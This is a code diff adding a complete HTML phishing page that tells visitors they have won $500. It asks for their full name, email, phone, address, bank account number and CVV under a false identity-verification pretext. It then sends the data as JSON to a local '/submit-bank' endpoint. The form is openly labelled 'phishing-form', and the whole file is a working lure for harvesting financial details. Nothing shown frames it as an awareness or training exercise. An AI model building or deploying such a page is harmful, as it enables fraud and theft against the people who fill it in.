@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! Claim Your Prize</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: url('reward.jpg') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .form-container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        input,
+        textarea {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+        }
+    </style>
+</head>
+
+<body class="flex items-center justify-center min-h-screen">
+    <div class="form-container w-full max-w-lg shadow-lg p-8 text-center">
+        <h1 class="text-3xl font-bold text-green-600 mb-4 animate-bounce">🎉 Congratulations! 🎉</h1>
+        <p class="text-white text-lg">You've won $500! Fill out the form to claim your reward.</p>
+
+        <form id="phishing-form" method="POST" class="mt-6 space-y-4">
+            <div>
+                <label for="full_name" class="block text-left font-semibold text-white">Full Name</label>
+                <input type="text" name="full_name" id="full_name" required class="w-full p-2 border rounded text-black">
+            </div>
+            <div>
+                <label for="email" class="block text-left font-semibold text-white">Email Address</label>
+                <input type="email" name="email" id="email" required class="w-full p-2 border rounded text-black">
+            </div>
+            <div>
+                <label for="phone" class="block text-left font-semibold text-white">Phone Number</label>
+                <input type="text" name="phone" id="phone" required class="w-full p-2 border rounded text-black">
+            </div>
+            <div>
+                <label for="address" class="block text-left font-semibold text-white">Address</label>
+                <textarea name="address" id="address" rows="3" required class="w-full p-2 border rounded text-black"></textarea>
+            </div>
+            <div>
+                <label for="bank_account" class="block text-left font-semibold text-white">Bank Account Number</label>
+                <input type="text" name="bank_account" id="bank_account" required class="w-full p-2 border rounded text-black">
+            </div>
+            <div>
+                <label for="cvv" class="block text-left font-semibold text-white">CVV</label>
+                <input type="password" name="cvv" id="cvv" required maxlength="3" class="w-full p-2 border rounded text-black">
+            </div>
+            <button type="submit" id="button" class="w-full bg-green-500 text-white py-2 rounded shadow-lg hover:bg-green-700 transition">
+                Claim Your Prize 🏆
+            </button>
+        </form>
+
+        <p class="text-sm text-white mt-4">* Your information is required to verify your identity and ship your reward.</p>
+    </div>
+
+    <script>
+        // Validation and submission of form
+        document.querySelector("#phishing-form").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            // Get form data
+            const formData = {
+                name: document.querySelector("#full_name").value,
+                email: document.querySelector("#email").value,
+                phone: document.querySelector("#phone").value,
+                address: document.querySelector("#address").value,
+                bank_account: document.querySelector("#bank_account").value,
+                cvv: document.querySelector("#cvv").value
+            };
+
+            // Validation
+            if (!formData.name || !formData.email || !formData.phone || !formData.address || !formData.bank_account || !formData.cvv) {
+                alert("All fields are required.");
+                return;
+            }
+
+            // Validate email format
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailPattern.test(formData.email)) {
+                alert("Please enter a valid email.");
+                return;
+            }
+
+            // Validate phone number (simple check for numbers)
+            const phonePattern = /^\d+$/;
+            if (!phonePattern.test(formData.phone)) {
+                alert("Phone number should contain only digits.");
+                return;
+            }
+
+            // Validate bank account number (simple check for alphanumeric)
+            const bankAccountPattern = /^[a-zA-Z0-9]+$/;
+            if (!bankAccountPattern.test(formData.bank_account)) {
+                alert("Bank account number should contain only alphanumeric characters.");
+                return;
+            }
+
+            // Validate CVV (only 3 digits)
+            if (formData.cvv.length !== 3 || isNaN(formData.cvv)) {
+                alert("CVV should be exactly 3 digits.");
+                return;
+            }
+
+            // Send data to backend
+            fetch("http://localhost:5000/submit-bank", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(formData)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    alert(data.message);  // Show success message
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("There was an error processing your request.");
+                });
+        });
+    </script>
+</body>
+
+</html>
